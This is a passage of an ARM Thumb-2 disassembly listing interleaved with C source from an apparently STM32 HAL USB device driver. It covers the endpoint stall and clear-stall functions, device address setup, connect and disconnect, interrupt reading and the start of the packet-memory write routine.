 8007fb4:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8007fb8:	4413      	add	r3, r2
 8007fba:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007fbe:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 8007fc2:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007fc6:	881b      	ldrh	r3, [r3, #0]
 8007fc8:	b29b      	uxth	r3, r3
 8007fca:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007fce:	b29a      	uxth	r2, r3
 8007fd0:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007fd4:	801a      	strh	r2, [r3, #0]
 8007fd6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fda:	2b3e      	cmp	r3, #62	; 0x3e
 8007fdc:	d923      	bls.n	8008026 <USB_EPStartXfer+0x1628>
 8007fde:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fe2:	095b      	lsrs	r3, r3, #5
 8007fe4:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8007fe8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fec:	f003 031f 	and.w	r3, r3, #31
 8007ff0:	2b00      	cmp	r3, #0
 8007ff2:	d104      	bne.n	8007ffe <USB_EPStartXfer+0x1600>
 8007ff4:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8007ff8:	3b01      	subs	r3, #1
 8007ffa:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8007ffe:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008002:	881b      	ldrh	r3, [r3, #0]
 8008004:	b29a      	uxth	r2, r3
 8008006:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 800800a:	b29b      	uxth	r3, r3
 800800c:	029b      	lsls	r3, r3, #10
 800800e:	b29b      	uxth	r3, r3
 8008010:	4313      	orrs	r3, r2
 8008012:	b29b      	uxth	r3, r3
 8008014:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008018:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800801c:	b29a      	uxth	r2, r3
 800801e:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008022:	801a      	strh	r2, [r3, #0]
 8008024:	e05c      	b.n	80080e0 <USB_EPStartXfer+0x16e2>
 8008026:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800802a:	2b00      	cmp	r3, #0
 800802c:	d10c      	bne.n	8008048 <USB_EPStartXfer+0x164a>
 800802e:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008032:	881b      	ldrh	r3, [r3, #0]
 8008034:	b29b      	uxth	r3, r3
 8008036:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800803a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800803e:	b29a      	uxth	r2, r3
 8008040:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008044:	801a      	strh	r2, [r3, #0]
 8008046:	e04b      	b.n	80080e0 <USB_EPStartXfer+0x16e2>
 8008048:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800804c:	085b      	lsrs	r3, r3, #1
 800804e:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008052:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008056:	f003 0301 	and.w	r3, r3, #1
 800805a:	2b00      	cmp	r3, #0
 800805c:	d004      	beq.n	8008068 <USB_EPStartXfer+0x166a>
 800805e:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008062:	3301      	adds	r3, #1
 8008064:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008068:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800806c:	881b      	ldrh	r3, [r3, #0]
 800806e:	b29a      	uxth	r2, r3
 8008070:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008074:	b29b      	uxth	r3, r3
 8008076:	029b      	lsls	r3, r3, #10
 8008078:	b29b      	uxth	r3, r3
 800807a:	4313      	orrs	r3, r2
 800807c:	b29a      	uxth	r2, r3
 800807e:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008082:	801a      	strh	r2, [r3, #0]
 8008084:	e02c      	b.n	80080e0 <USB_EPStartXfer+0x16e2>
 8008086:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800808a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800808e:	681b      	ldr	r3, [r3, #0]
 8008090:	785b      	ldrb	r3, [r3, #1]
 8008092:	2b01      	cmp	r3, #1
 8008094:	d124      	bne.n	80080e0 <USB_EPStartXfer+0x16e2>
 8008096:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800809a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800809e:	681b      	ldr	r3, [r3, #0]
 80080a0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80080a4:	b29b      	uxth	r3, r3
 80080a6:	461a      	mov	r2, r3
 80080a8:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80080ac:	4413      	add	r3, r2
 80080ae:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 80080b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080ba:	681b      	ldr	r3, [r3, #0]
 80080bc:	781b      	ldrb	r3, [r3, #0]
 80080be:	00da      	lsls	r2, r3, #3
 80080c0:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80080c4:	4413      	add	r3, r2
 80080c6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80080ca:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 80080ce:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080d2:	b29a      	uxth	r2, r3
 80080d4:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 80080d8:	801a      	strh	r2, [r3, #0]
 80080da:	e001      	b.n	80080e0 <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 80080dc:	2301      	movs	r3, #1
 80080de:	e03a      	b.n	8008156 <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80080e0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080e4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80080e8:	681a      	ldr	r2, [r3, #0]
 80080ea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080ee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080f2:	681b      	ldr	r3, [r3, #0]
 80080f4:	781b      	ldrb	r3, [r3, #0]
 80080f6:	009b      	lsls	r3, r3, #2
 80080f8:	4413      	add	r3, r2
 80080fa:	881b      	ldrh	r3, [r3, #0]
 80080fc:	b29b      	uxth	r3, r3
 80080fe:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8008102:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008106:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800810a:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800810e:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8008112:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008116:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800811a:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800811e:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008122:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008126:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800812a:	681a      	ldr	r2, [r3, #0]
 800812c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008130:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008134:	681b      	ldr	r3, [r3, #0]
 8008136:	781b      	ldrb	r3, [r3, #0]
 8008138:	009b      	lsls	r3, r3, #2
 800813a:	441a      	add	r2, r3
 800813c:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008140:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008144:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008148:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800814c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008150:	b29b      	uxth	r3, r3
 8008152:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008154:	2300      	movs	r3, #0
}
 8008156:	4618      	mov	r0, r3
 8008158:	f507 7784 	add.w	r7, r7, #264	; 0x108
 800815c:	46bd      	mov	sp, r7
 800815e:	bd80      	pop	{r7, pc}

08008160 <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8008160:	b480      	push	{r7}
 8008162:	b085      	sub	sp, #20
 8008164:	af00      	add	r7, sp, #0
 8008166:	6078      	str	r0, [r7, #4]
 8008168:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 800816a:	683b      	ldr	r3, [r7, #0]
 800816c:	785b      	ldrb	r3, [r3, #1]
 800816e:	2b00      	cmp	r3, #0
 8008170:	d020      	beq.n	80081b4 <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 8008172:	687a      	ldr	r2, [r7, #4]
 8008174:	683b      	ldr	r3, [r7, #0]
 8008176:	781b      	ldrb	r3, [r3, #0]
 8008178:	009b      	lsls	r3, r3, #2
 800817a:	4413      	add	r3, r2
 800817c:	881b      	ldrh	r3, [r3, #0]
 800817e:	b29b      	uxth	r3, r3
 8008180:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008184:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008188:	81bb      	strh	r3, [r7, #12]
 800818a:	89bb      	ldrh	r3, [r7, #12]
 800818c:	f083 0310 	eor.w	r3, r3, #16
 8008190:	81bb      	strh	r3, [r7, #12]
 8008192:	687a      	ldr	r2, [r7, #4]
 8008194:	683b      	ldr	r3, [r7, #0]
 8008196:	781b      	ldrb	r3, [r3, #0]
 8008198:	009b      	lsls	r3, r3, #2
 800819a:	441a      	add	r2, r3
 800819c:	89bb      	ldrh	r3, [r7, #12]
 800819e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80081a2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80081a6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80081aa:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80081ae:	b29b      	uxth	r3, r3
 80081b0:	8013      	strh	r3, [r2, #0]
 80081b2:	e01f      	b.n	80081f4 <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 80081b4:	687a      	ldr	r2, [r7, #4]
 80081b6:	683b      	ldr	r3, [r7, #0]
 80081b8:	781b      	ldrb	r3, [r3, #0]
 80081ba:	009b      	lsls	r3, r3, #2
 80081bc:	4413      	add	r3, r2
 80081be:	881b      	ldrh	r3, [r3, #0]
 80081c0:	b29b      	uxth	r3, r3
 80081c2:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80081c6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80081ca:	81fb      	strh	r3, [r7, #14]
 80081cc:	89fb      	ldrh	r3, [r7, #14]
 80081ce:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80081d2:	81fb      	strh	r3, [r7, #14]
 80081d4:	687a      	ldr	r2, [r7, #4]
 80081d6:	683b      	ldr	r3, [r7, #0]
 80081d8:	781b      	ldrb	r3, [r3, #0]
 80081da:	009b      	lsls	r3, r3, #2
 80081dc:	441a      	add	r2, r3
 80081de:	89fb      	ldrh	r3, [r7, #14]
 80081e0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80081e4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80081e8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80081ec:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80081f0:	b29b      	uxth	r3, r3
 80081f2:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 80081f4:	2300      	movs	r3, #0
}
 80081f6:	4618      	mov	r0, r3
 80081f8:	3714      	adds	r7, #20
 80081fa:	46bd      	mov	sp, r7
 80081fc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008200:	4770      	bx	lr

08008202 <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8008202:	b480      	push	{r7}
 8008204:	b087      	sub	sp, #28
 8008206:	af00      	add	r7, sp, #0
 8008208:	6078      	str	r0, [r7, #4]
 800820a:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 800820c:	683b      	ldr	r3, [r7, #0]
 800820e:	7b1b      	ldrb	r3, [r3, #12]
 8008210:	2b00      	cmp	r3, #0
 8008212:	f040 809d 	bne.w	8008350 <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 8008216:	683b      	ldr	r3, [r7, #0]
 8008218:	785b      	ldrb	r3, [r3, #1]
 800821a:	2b00      	cmp	r3, #0
 800821c:	d04c      	beq.n	80082b8 <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800821e:	687a      	ldr	r2, [r7, #4]
 8008220:	683b      	ldr	r3, [r7, #0]
 8008222:	781b      	ldrb	r3, [r3, #0]
 8008224:	009b      	lsls	r3, r3, #2
 8008226:	4413      	add	r3, r2
 8008228:	881b      	ldrh	r3, [r3, #0]
 800822a:	823b      	strh	r3, [r7, #16]
 800822c:	8a3b      	ldrh	r3, [r7, #16]
 800822e:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8008232:	2b00      	cmp	r3, #0
 8008234:	d01b      	beq.n	800826e <USB_EPClearStall+0x6c>
 8008236:	687a      	ldr	r2, [r7, #4]
 8008238:	683b      	ldr	r3, [r7, #0]
 800823a:	781b      	ldrb	r3, [r3, #0]
 800823c:	009b      	lsls	r3, r3, #2
 800823e:	4413      	add	r3, r2
 8008240:	881b      	ldrh	r3, [r3, #0]
 8008242:	b29b      	uxth	r3, r3
 8008244:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008248:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800824c:	81fb      	strh	r3, [r7, #14]
 800824e:	687a      	ldr	r2, [r7, #4]
 8008250:	683b      	ldr	r3, [r7, #0]
 8008252:	781b      	ldrb	r3, [r3, #0]
 8008254:	009b      	lsls	r3, r3, #2
 8008256:	441a      	add	r2, r3
 8008258:	89fb      	ldrh	r3, [r7, #14]
 800825a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800825e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008262:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008266:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800826a:	b29b      	uxth	r3, r3
 800826c:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 800826e:	683b      	ldr	r3, [r7, #0]
 8008270:	78db      	ldrb	r3, [r3, #3]
 8008272:	2b01      	cmp	r3, #1
 8008274:	d06c      	beq.n	8008350 <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8008276:	687a      	ldr	r2, [r7, #4]
 8008278:	683b      	ldr	r3, [r7, #0]
 800827a:	781b      	ldrb	r3, [r3, #0]
 800827c:	009b      	lsls	r3, r3, #2
 800827e:	4413      	add	r3, r2
 8008280:	881b      	ldrh	r3, [r3, #0]
 8008282:	b29b      	uxth	r3, r3
 8008284:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008288:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800828c:	81bb      	strh	r3, [r7, #12]
 800828e:	89bb      	ldrh	r3, [r7, #12]
 8008290:	f083 0320 	eor.w	r3, r3, #32
 8008294:	81bb      	strh	r3, [r7, #12]
 8008296:	687a      	ldr	r2, [r7, #4]
 8008298:	683b      	ldr	r3, [r7, #0]
 800829a:	781b      	ldrb	r3, [r3, #0]
 800829c:	009b      	lsls	r3, r3, #2
 800829e:	441a      	add	r2, r3
 80082a0:	89bb      	ldrh	r3, [r7, #12]
 80082a2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80082a6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80082aa:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80082ae:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80082b2:	b29b      	uxth	r3, r3
 80082b4:	8013      	strh	r3, [r2, #0]
 80082b6:	e04b      	b.n	8008350 <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80082b8:	687a      	ldr	r2, [r7, #4]
 80082ba:	683b      	ldr	r3, [r7, #0]
 80082bc:	781b      	ldrb	r3, [r3, #0]
 80082be:	009b      	lsls	r3, r3, #2
 80082c0:	4413      	add	r3, r2
 80082c2:	881b      	ldrh	r3, [r3, #0]
 80082c4:	82fb      	strh	r3, [r7, #22]
 80082c6:	8afb      	ldrh	r3, [r7, #22]
 80082c8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80082cc:	2b00      	cmp	r3, #0
 80082ce:	d01b      	beq.n	8008308 <USB_EPClearStall+0x106>
 80082d0:	687a      	ldr	r2, [r7, #4]
 80082d2:	683b      	ldr	r3, [r7, #0]
 80082d4:	781b      	ldrb	r3, [r3, #0]
 80082d6:	009b      	lsls	r3, r3, #2
 80082d8:	4413      	add	r3, r2
 80082da:	881b      	ldrh	r3, [r3, #0]
 80082dc:	b29b      	uxth	r3, r3
 80082de:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80082e2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80082e6:	82bb      	strh	r3, [r7, #20]
 80082e8:	687a      	ldr	r2, [r7, #4]
 80082ea:	683b      	ldr	r3, [r7, #0]
 80082ec:	781b      	ldrb	r3, [r3, #0]
 80082ee:	009b      	lsls	r3, r3, #2
 80082f0:	441a      	add	r2, r3
 80082f2:	8abb      	ldrh	r3, [r7, #20]
 80082f4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80082f8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80082fc:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8008300:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008304:	b29b      	uxth	r3, r3
 8008306:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8008308:	687a      	ldr	r2, [r7, #4]
 800830a:	683b      	ldr	r3, [r7, #0]
 800830c:	781b      	ldrb	r3, [r3, #0]
 800830e:	009b      	lsls	r3, r3, #2
 8008310:	4413      	add	r3, r2
 8008312:	881b      	ldrh	r3, [r3, #0]
 8008314:	b29b      	uxth	r3, r3
 8008316:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800831a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800831e:	827b      	strh	r3, [r7, #18]
 8008320:	8a7b      	ldrh	r3, [r7, #18]
 8008322:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8008326:	827b      	strh	r3, [r7, #18]
 8008328:	8a7b      	ldrh	r3, [r7, #18]
 800832a:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800832e:	827b      	strh	r3, [r7, #18]
 8008330:	687a      	ldr	r2, [r7, #4]
 8008332:	683b      	ldr	r3, [r7, #0]
 8008334:	781b      	ldrb	r3, [r3, #0]
 8008336:	009b      	lsls	r3, r3, #2
 8008338:	441a      	add	r2, r3
 800833a:	8a7b      	ldrh	r3, [r7, #18]
 800833c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008340:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008344:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008348:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800834c:	b29b      	uxth	r3, r3
 800834e:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 8008350:	2300      	movs	r3, #0
}
 8008352:	4618      	mov	r0, r3
 8008354:	371c      	adds	r7, #28
 8008356:	46bd      	mov	sp, r7
 8008358:	f85d 7b04 	ldr.w	r7, [sp], #4
 800835c:	4770      	bx	lr

0800835e <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 800835e:	b480      	push	{r7}
 8008360:	b083      	sub	sp, #12
 8008362:	af00      	add	r7, sp, #0
 8008364:	6078      	str	r0, [r7, #4]
 8008366:	460b      	mov	r3, r1
 8008368:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 800836a:	78fb      	ldrb	r3, [r7, #3]
 800836c:	2b00      	cmp	r3, #0
 800836e:	d103      	bne.n	8008378 <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 8008370:	687b      	ldr	r3, [r7, #4]
 8008372:	2280      	movs	r2, #128	; 0x80
 8008374:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 8008378:	2300      	movs	r3, #0
}
 800837a:	4618      	mov	r0, r3
 800837c:	370c      	adds	r7, #12
 800837e:	46bd      	mov	sp, r7
 8008380:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008384:	4770      	bx	lr

08008386 <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 8008386:	b480      	push	{r7}
 8008388:	b083      	sub	sp, #12
 800838a:	af00      	add	r7, sp, #0
 800838c:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 800838e:	687b      	ldr	r3, [r7, #4]
 8008390:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 8008394:	b29b      	uxth	r3, r3
 8008396:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800839a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800839e:	b29a      	uxth	r2, r3
 80083a0:	687b      	ldr	r3, [r7, #4]
 80083a2:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80083a6:	2300      	movs	r3, #0
}
 80083a8:	4618      	mov	r0, r3
 80083aa:	370c      	adds	r7, #12
 80083ac:	46bd      	mov	sp, r7
 80083ae:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083b2:	4770      	bx	lr

080083b4 <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 80083b4:	b480      	push	{r7}
 80083b6:	b083      	sub	sp, #12
 80083b8:	af00      	add	r7, sp, #0
 80083ba:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 80083bc:	687b      	ldr	r3, [r7, #4]
 80083be:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 80083c2:	b29b      	uxth	r3, r3
 80083c4:	f3c3 030e 	ubfx	r3, r3, #0, #15
 80083c8:	b29a      	uxth	r2, r3
 80083ca:	687b      	ldr	r3, [r7, #4]
 80083cc:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80083d0:	2300      	movs	r3, #0
}
 80083d2:	4618      	mov	r0, r3
 80083d4:	370c      	adds	r7, #12
 80083d6:	46bd      	mov	sp, r7
 80083d8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083dc:	4770      	bx	lr

080083de <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 80083de:	b480      	push	{r7}
 80083e0:	b085      	sub	sp, #20
 80083e2:	af00      	add	r7, sp, #0
 80083e4:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 80083e6:	687b      	ldr	r3, [r7, #4]
 80083e8:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80083ec:	b29b      	uxth	r3, r3
 80083ee:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 80083f0:	68fb      	ldr	r3, [r7, #12]
}
 80083f2:	4618      	mov	r0, r3
 80083f4:	3714      	adds	r7, #20
 80083f6:	46bd      	mov	sp, r7
 80083f8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083fc:	4770      	bx	lr

080083fe <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 80083fe:	b480      	push	{r7}
 8008400:	b083      	sub	sp, #12
 8008402:	af00      	add	r7, sp, #0
 8008404:	6078      	str	r0, [r7, #4]
 8008406:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8008408:	2300      	movs	r3, #0
}
 800840a:	4618      	mov	r0, r3
 800840c:	370c      	adds	r7, #12
 800840e:	46bd      	mov	sp, r7
 8008410:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008414:	4770      	bx	lr

08008416 <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 8008416:	b480      	push	{r7}
 8008418:	b08b      	sub	sp, #44	; 0x2c
 800841a:	af00      	add	r7, sp, #0
 800841c:	60f8      	str	r0, [r7, #12]
 800841e:	60b9      	str	r1, [r7, #8]
 8008420:	4611      	mov	r1, r2
 8008422:	461a      	mov	r2, r3
 8008424:	460b      	mov	r3, r1
 8008426:	80fb      	strh	r3, [r7, #6]
 8008428:	4613      	mov	r3, r2
 800842a:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 800842c:	88bb      	ldrh	r3, [r7, #4]
 800842e:	3301      	adds	r3, #1
 8008430:	085b      	lsrs	r3, r3, #1
 8008432:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 8008434:	68fb      	ldr	r3, [r7, #12]
 8008436:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 8008438:	68bb      	ldr	r3, [r7, #8]
 800843a:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 800843c:	88fa      	ldrh	r2, [r7, #6]
 800843e:	697b      	ldr	r3, [r7, #20]
 8008440:	4413      	add	r3, r2
 8008442:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8008446:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008448:	69bb      	ldr	r3, [r7, #24]
 800844a:	627b      	str	r3, [r7, #36]	; 0x24
 800844c:	e01b      	b.n	8008486 <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 800844e:	69fb      	ldr	r3, [r7, #28]
 8008450:	781b      	ldrb	r3, [r3, #0]
 8008452:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 8008454:	69fb      	ldr	r3, [r7, #28]
 8008456:	3301      	adds	r3, #1
 8008458:	781b      	ldrb	r3, [r3, #0]
 800845a:	021b      	lsls	r3, r3, #8
 800845c:	b21a      	sxth	r2, r3
 800845e:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 8008462:	4313      	orrs	r3, r2
 8008464:	b21b      	sxth	r3, r3
 8008466:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 8008468:	6a3b      	ldr	r3, [r7, #32]
 800846a:	8a7a      	ldrh	r2, [r7, #18]
 800846c:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 800846e:	6a3b      	ldr	r3, [r7, #32]
 8008470:	3302      	adds	r3, #2
